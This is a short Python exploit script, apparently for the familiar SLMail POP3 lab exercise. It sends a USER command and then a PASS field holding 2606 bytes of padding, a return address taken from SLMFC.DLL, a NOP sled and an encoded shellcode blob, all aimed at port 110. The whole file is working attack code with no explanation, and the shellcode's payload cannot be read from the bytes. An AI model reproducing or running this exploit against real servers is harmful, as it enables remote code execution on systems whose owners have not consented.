import socket

# SOCKET
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 110))
s.recv(1024)
s.send(b"USER luiz\n")
s.recv(1024)

# \x00\x0a
# SLMFC.DLL - 0x5f4a358f
shellcode = ("\xbb\x8e\x55\x8a\xbb\xd9\xee\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x59\x31\x5a\x14\x83\xea\xfc\x03\x5a\x10\x6c\xa0\x76\x53\xff"
"\x4b\x87\xa4\x9f\xc2\x62\x95\x8d\xb1\xe7\x84\x01\xb1\xaa\x24"
"\xea\x97\x5e\x04\x13\x18\xe8\x2c\xcd\xac\x64\x99\x20\x73\x24"
"\xe5\x23\x0f\x37\x3a\x83\x2e\xf8\x4f\xc2\x77\x4e\x25\x2b\x25"
"\x06\x4e\xe1\xda\x23\x12\x39\xda\xe3\x18\x01\xa4\x86\xdf\xf5"
"\x18\x88\x0f\xa5\x2b\xc2\xb7\xce\x74\xf3\xc6\x03\x01\x3a\xbc"
"\x9f\x43\x36\x09\x54\x62\xb7\x73\xbc\xb4\x87\xb5\x8f\xba\xab"
"\x37\xc8\xfd\x53\x42\x22\xfe\xee\x55\xf1\x7c\x35\xd3\xe5\x27"
"\xbe\x43\xc1\xd6\x13\x15\x82\xd5\xd8\x51\xcc\xf9\xdf\xb6\x67"
"\x05\x6b\x39\xa7\x8f\x2f\x1e\x63\xcb\xf4\x3f\x32\xb1\x5b\x3f"
"\x24\x1d\x03\xe5\x2f\x8c\x52\x99\xd0\x4e\x5b\xc7\x46\x82\x96"
"\xf8\x96\x8c\xa1\x8b\xa4\x13\x1a\x04\x84\xdc\x84\xd3\x9d\xcb"
"\x36\x0b\x25\x9b\xc8\xac\x55\xb5\x0e\xf8\x05\xad\xa7\x81\xce"
"\x2d\x47\x54\x7a\x24\xdf\x97\xd2\x5c\x77\x70\x20\x9d\x86\x3b"
"\xad\x7b\xd8\x6b\xfd\xd3\x99\xdb\xbd\x83\x71\x36\x32\xfb\x62"
"\x39\x99\x94\x09\xd6\x77\xcc\xa5\x4f\xd2\x86\x54\x8f\xc9\xe2"
"\x57\x1b\xfb\x13\x19\xec\x8e\x07\x4e\x8b\x70\xd8\x8f\x3e\x70"
"\xb2\x8b\xe8\x27\x2a\x96\xcd\x0f\xf5\x69\x38\x0c\xf2\x96\xbd"
"\x24\x88\xa1\x2b\x08\xe6\xcd\xbb\x88\xf6\x9b\xd1\x88\x9e\x7b"
"\x82\xdb\xbb\x83\x1f\x48\x10\x16\xa0\x38\xc4\xb1\xc8\xc6\x33"
"\xf5\x56\x39\x16\x85\x91\xc5\xe4\xa2\x39\xad\x16\xf3\xb9\x2d"
"\x7d\xf3\xe9\x45\x8a\xdc\x06\xa5\x73\xf7\x4e\xad\xfe\x96\x3d"
"\x4c\xfe\xb2\xe0\xd0\xff\x31\x39\xe3\x7a\x39\xbe\x04\x7b\x53"
"\xdb\x05\x7b\x5b\xdd\x3a\xad\x62\xab\x7d\x6d\xd1\xa4\xc8\xd0"
"\x70\x2f\x32\x46\x82\x7a")

# BUFF
buff = "A" * 2606
buff += "\x8f\x35\x4a\x5f"
buff += "\x90" * 20
buff += shellcode

# DATA
data = "PASS {}\n".format(buff)
s.send(data.encode("latin-1"))
print(s.recv(1024))
